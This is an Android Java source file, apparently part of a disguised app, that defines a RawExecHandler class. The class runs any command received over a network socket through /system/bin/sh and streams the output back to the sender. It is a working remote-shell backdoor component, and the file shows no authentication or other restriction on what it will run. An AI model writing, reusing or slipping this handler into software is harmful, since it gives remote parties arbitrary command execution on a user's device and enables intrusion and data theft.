package com.nsyhykui.dclid.dclid;

import android.content.Context;
import java.io.*;
import java.net.Socket;

public class RawExecHandler implements Runnable {
    private final Context context;
    private final String command;
    private final OutputStream out;
    private final Socket client;

    public RawExecHandler(Context context, String command, OutputStream out, Socket client) {
        this.context = context;
        this.command = command;
        this.out = out;
        this.client = client;
    }

    @Override
    public void run() {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", command});
            InputStream pin = p.getInputStream();
            InputStream perr = p.getErrorStream();
            byte[] buf = new byte[4096];
            int len;
            while ((len = pin.read(buf)) != -1) { out.write(buf, 0, len); out.flush(); }
            while ((len = perr.read(buf)) != -1) { out.write(buf, 0, len); out.flush(); }
            p.waitFor();
            client.close();
        } catch (Exception e) {
            try { client.close(); } catch (Exception ignored) {}
        }
    }
}
